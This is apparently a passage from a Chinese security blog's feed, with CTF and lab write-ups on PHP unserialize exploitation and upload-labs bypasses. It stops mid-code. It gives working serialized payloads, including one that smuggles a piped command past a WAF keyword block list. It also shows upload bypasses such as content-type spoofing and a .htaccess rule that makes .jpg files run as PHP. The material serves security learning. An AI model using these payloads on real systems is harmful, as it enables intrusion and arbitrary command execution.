<h2 id="一个例子">一个例子</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建一个对象south</span></span><br><span class="line">    <span class="variable">$south</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$south</span> -&gt; name = <span class="string">&quot;south&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出序列化后的值</span></span><br><span class="line">    <span class="variable">$north</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$south</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$north</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将north反序列化成对象southseast</span></span><br><span class="line">    <span class="variable">$southseast</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$north</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$southseast</span>-&gt;age.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码运行后得到的最终结果是<strong>age=18</strong>，很明显的推断就是同官方文档所说，在创建一个对象的时候<strong>PHP</strong>自动执行了对象内的**__construct()**函数。</p>
<h2 id="常见的魔术方法">常见的魔术方法</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() // 使用unserialize时触发</span><br><span class="line">__sleep() // 使用serialize时触发</span><br><span class="line">__destruct() // 对象被销毁时触发</span><br><span class="line">__call() // 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() // 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() // 用于从不可访问的属性读取数据</span><br><span class="line">__set() // 用于将数据写入不可访问的属性</span><br><span class="line">__isset() // 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() // 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() // 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() // 当脚本尝试将对象调用为函数时触发</span><br><span class="line">__construct() // 当一个对象创建时被调用</span><br><span class="line">__destruct() // 当一个对象销毁时被调用</span><br></pre></td></tr></table></figure>
<h2 id="需要重点注意的函数">需要重点注意的函数</h2>
<h3 id="命令执行">命令执行</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure>
<h3 id="文件操作">文件操作</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure>
<p>如果在跟进程序过程中发现这些函数就要打起精神，一旦这些函数的参数我们能够控制，就有可能出现高危漏洞。</p>
<h2 id="一些例子">一些例子</h2>
<h3 id="简单例子">简单例子</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$command</span>=<span class="string">&quot;php hello.txt&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$command</span>)</span><br><span class="line">        <span class="variable">$hello</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$hello</span>-&gt;<span class="title function_ invoke__">visit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>此处如果构造一个对象的<strong>command</strong>参数是一段恶意代码并序列化后传参进入，就能造成一个有效攻击。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$command</span>=<span class="string">&quot;php hello.txt&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hello</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Hello&quot;:1:&#123;s:7:&quot;command&quot;;s:13:&quot;php hello.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>就能访问到目录下的<strong>flag</strong>文件了。</p>
<h3 id="welcome-to-bugkuctf"><a
href="http://120.24.86.145:8006/test1/">welcome to bugkuctf</a></h3>
<p>今年黑盾有一题也跟这个一样，解法写在另一篇讲述<a
href="https://southsea.st/2018/08/01/Study-File-Inclusion/">文件包含</a>的文章中了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 部分代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>index.php</strong>传入两个参数，一个是<strong>file</strong>，一个是<strong>password</strong>，再看<strong>hint.php</strong>，构造了一个类，其中的**__tostring()<strong>这个方法在</strong>index.php<strong>的</strong>echo
<span
class="math inline">\(password;**时会被调用，那么解题思路就是对**file**传参**hint.php**，使**index.php**达成**include(hint.php);**这一个指令，然后**password**传入一个**\)</span>file<strong>成员变量，使得</strong>__tostring()<strong>方法中的</strong>file_get_contents(<span
class="math inline">\(this-&gt;file);**指令可以读取**\)</span>file<strong>成员变量所传入的文件名。而此处的文件名明显是</strong>flag.php**了</p>
<p>构造的类如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();  </span><br><span class="line">    <span class="variable">$a</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>最终<strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="php">PHP</h3>
<p><strong>.git</strong>源码泄漏就不多说了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php部分代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tips</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;tips&#x27;</span>];</span><br><span class="line"><span class="variable">$tip</span>  = @<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $tips;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$tip</span>)&amp;&amp;(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tip</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;you got this&quot;</span>))&#123;</span><br><span class="line"><span class="comment">// echo 123;</span></span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$tips</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>包含了<strong>class.php</strong>和<strong>waf.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;passage&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$black</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		<span class="comment">//echo &quot;\n&quot;.$this-&gt;page;</span></span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./templates/<span class="subst">$this</span>-&gt;file.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title class_">Blog</span>();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看出<strong>Blog</strong>类中有一个**__destruct()<strong>方法，起作用是当一个对象销毁时调用</strong>system<strong>这个指令，而在最后有一句</strong>unset(<span
class="math inline">\(b)**的销毁对象指令，且可控的部分只有**\)</span>this-&gt;file<strong>，后面被</strong>.php<strong>给闭合，故此需要使用</strong>|<strong>管道符来进行操作，其作用于此做个笔记，就是把左边命令的输出数据作为右边命令的输入数据，先执行左边的命令，再执行右边的命令，类似的操作比如在</strong>Linux<strong>下寻找对应的软件包</strong>rpm
-qa|grep
nginx<strong>，先列出所有的软件包，然后寻找</strong>Nginx**。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// waf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$black</span> = [];</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>并没有过滤什么，那么大致构造的<strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:30:&quot;Flag.php|cat ../templates/Flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>并没有成功，<strong>git</strong>查看历史版本的<strong>waf</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$black</span> = [<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;mv&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;$IFS$9&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%0d&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;ps&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;ifconfig&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;curl&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;**&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>];</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>于是最终<strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:34:&quot;Flag.php|ca&#x27;&#x27;t$IFS./templates/Flag&quot;;&#125; </span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a href="http://www.she1don.cn/index.php/archives/15.html">php
反序列化入门</a></p>
<p><a
href="http://www.lmxspace.com/2018/05/03/php-unserialize-%E5%88%9D%E8%AF%86/">php-unserialize-初识</a></p>
<p><a href="https://xz.aliyun.com/t/2467">[红日安全]代码审计Day4 -
strpos使用不当引发漏洞</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>浅探 Shiro 反序列化</title>
    <url>/Study-Unserialize-Shiro/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2721278c8877089554994494b7aad8bfb567912b2885ca07316efd1513f226ef">7e2e5d8e84a6dbe261d42399a5b5d367125725856234f6e97b815e1aeed415d1d9f87ecf93956429a3ea44c4fe2a043ee525fe34e4d9c6bf5c154fcf5fa9a72f1bafb68b597e0d7646ffff4184768b836340a3e98e39100189215b23aaa97caaee857edda683f7c9e9848e4e93be6be83729d2f3aa9cd47b5cd0ac18eff530b03efb902aebd482234f3a03d3b273b54e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全文件上传修炼计划</title>
    <url>/Study-Upload-Labs/</url>
    <content><![CDATA[<h3 id="运行环境">运行环境</h3>
<p>操作系统：<strong>Windows</strong>、<strong>Linux</strong></p>
<p><strong>php</strong>版本：推荐<strong>5.2.17</strong>【其他版本可能会导致部分<strong>Pass</strong>无法突破。</p>
<p><strong>php</strong>组件：<strong>php_gd2、php_exif</strong>【部分<strong>Pass</strong>需要开启这两个组件。</p>
<p><strong>apache</strong>：以<strong>moudel</strong>方式连接</p>
<span id="more"></span>
<h3 id="题解">题解</h3>
<h4 id="pass-01">Pass-01</h4>
<p>文件上传的检验代码写在了<strong>JavaScript</strong>中。</p>
<p>源码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">	<span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">	<span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">	<span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">	<span class="comment">//提取上传文件的类型</span></span><br><span class="line">	<span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">	<span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">	<span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">	<span class="title function_">alert</span>(errMsg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过的方法很简单，抓包后将<strong>jpg</strong>后缀改成<strong>php</strong>然后提交即可。</p>
<h4 id="pass-02">Pass-02</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看源码发现只判断了<strong>content-type</strong>，于是抓包的修改成<strong>image/jpeg</strong>就可以绕过了。</p>
<h4 id="pass-03">Pass-03</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = UPLOAD_PATH .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地写一个<strong>.htaccess</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<p>后面可以改成未被拦截过滤的后缀名就行了。</p>
<h4 id="pass-04">Pass-04</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span 